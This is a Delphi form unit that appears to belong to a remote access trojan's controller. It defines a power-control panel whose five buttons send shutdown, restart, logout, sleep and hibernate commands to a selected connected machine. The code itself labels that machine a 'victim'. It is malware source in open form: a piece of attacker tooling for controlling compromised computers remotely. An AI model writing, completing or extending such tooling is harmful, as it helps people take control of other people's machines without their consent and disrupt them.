unit FrmPower;

interface

uses
  Winapi.Windows, Winapi.Messages, System.SysUtils, System.Variants,
  System.Classes, Vcl.Graphics,
  Vcl.Controls, Vcl.Forms, Vcl.Dialogs, Vcl.StdCtrls;

type
  TForm12 = class(TForm)
    Button1: TButton;
    Button2: TButton;
    Button3: TButton;
    Button4: TButton;
    Button5: TButton;
    procedure Button1Click(Sender: TObject);
    procedure Button2Click(Sender: TObject);
    procedure Button3Click(Sender: TObject);
    procedure Button4Click(Sender: TObject);
    procedure Button5Click(Sender: TObject);
  private
    { Private declarations }
  public
    ThisFormsVictimID: string;
  end;

var
  Form12: TForm12;

implementation

{$R *.dfm}

uses FrmMain;

procedure SendToSelectedClient(const VictimID, Msg: string);
var
  I: Integer;
  NickName: string;
  UserData: TConnectedUserData;
begin
  NickName := VictimID;
  for I := 0 to Form1.ConnectedUsers.Count - 1 do
  begin
    UserData := TConnectedUserData(Form1.ConnectedUsers.Objects[I]);
    if UserData.ID = NickName then
    begin
      Form1.ServerSource.ExecCommand(UserData.Line, 0, BytesOf(Msg), False);
      Exit;
    end;
  end;
end;

procedure TForm12.Button1Click(Sender: TObject);
begin
  SendToSelectedClient(ThisFormsVictimID, 'Shutdown|');
end;

procedure TForm12.Button2Click(Sender: TObject);
begin
  SendToSelectedClient(ThisFormsVictimID, 'Restart|');
end;

procedure TForm12.Button3Click(Sender: TObject);
begin
  SendToSelectedClient(ThisFormsVictimID, 'Logout|');
end;

procedure TForm12.Button4Click(Sender: TObject);
begin
  SendToSelectedClient(ThisFormsVictimID, 'Sleep|');
end;

procedure TForm12.Button5Click(Sender: TObject);
begin
  SendToSelectedClient(ThisFormsVictimID, 'Harbinate|');
end;

end.
